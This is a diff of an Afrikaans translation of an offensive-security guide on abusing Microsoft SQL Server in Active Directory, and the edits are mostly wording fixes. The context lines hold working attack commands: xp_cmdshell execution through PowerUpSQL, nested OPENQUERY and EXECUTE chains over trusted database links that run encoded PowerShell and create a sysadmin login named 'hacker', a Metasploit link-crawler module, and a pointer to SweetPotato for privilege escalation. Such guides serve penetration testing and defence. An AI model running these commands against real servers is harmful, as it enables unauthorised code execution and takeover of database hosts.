@@ -126,7 +126,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ## MSSQL Basiese Misbruik
 
-### Toegang tot DB
+### Toegang DB
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -140,12 +140,12 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Dit mag ook moontlik wees om **opdragte** binne die MSSQL-gasheer uit te voer
+Dit mag ook moontlik wees om **opdragte** binne die MSSQL-gasheer uit te voer.
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Check in die bladsy genoem in die **volgende afdeling hoe om dit handmatig te doen.**
+Check in die blad genoem in die **volgende afdeling hoe om dit handmatig te doen.**
 
 ### MSSQL Basiese Hacking Tricks
 
@@ -155,7 +155,7 @@ Check in die bladsy genoem in die **volgende afdeling hoe om dit handmatig te do
 
 ## MSSQL Vertroude Skakels
 
-As 'n MSSQL-instansie vertrou (databasis skakel) deur 'n ander MSSQL-instansie. As die gebruiker voorregte oor die vertroude databasis het, sal hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
+As 'n MSSQL-instansie vertrou (databasis skakel) deur 'n ander MSSQL-instansie. As die gebruiker voorregte oor die vertroude databasis het, gaan hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
 
 **Die skakels tussen databasisse werk selfs oor woudvertroue.**
 
@@ -193,7 +193,7 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Jy kan maklik vir vertroude skakels kyk met metasploit.
+Jy kan maklik vertroude skakels nagaan met metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -203,7 +203,7 @@ Let wel dat metasploit slegs die `openquery()` funksie in MSSQL sal probeer misb
 
 ### Handmatig - Openquery()
 
-Van **Linux** kan jy 'n MSSQL konsole-skal met **sqsh** en **mssqlclient.py** verkry.
+Van **Linux** kan jy 'n MSSQL konsole-shel met **sqsh** en **mssqlclient.py** verkry.
 
 Van **Windows** kan jy ook die skakels vind en opdragte handmatig uitvoer met 'n **MSSQL kliënt soos** [**HeidiSQL**](https://www.heidisql.com)
 
@@ -238,11 +238,11 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-If you cannot perform actions like `exec xp_cmdshell` from `openquery()` try with the `EXECUTE` method.
+As jy nie aksies soos `exec xp_cmdshell` vanaf `openquery()` kan uitvoer nie, probeer die `EXECUTE` metode.
 
 ### Handmatig - EXECUTE
 
-Jy kan ook vertroude skakels misbruik maak deur `EXECUTE`:
+Jy kan ook vertroude skakels misbruik deur `EXECUTE` te gebruik:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -252,7 +252,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit stel die rekening in staat om "‘n kliënt na verifikasie te verteenwoordig".
 
-‘n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer by 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens verteenwoordig terwyl dit probeer om te verifieer.
+'n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer met 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens verteenwoordig terwyl dit probeer om te verifieer.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskillende tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` opdrag.
 
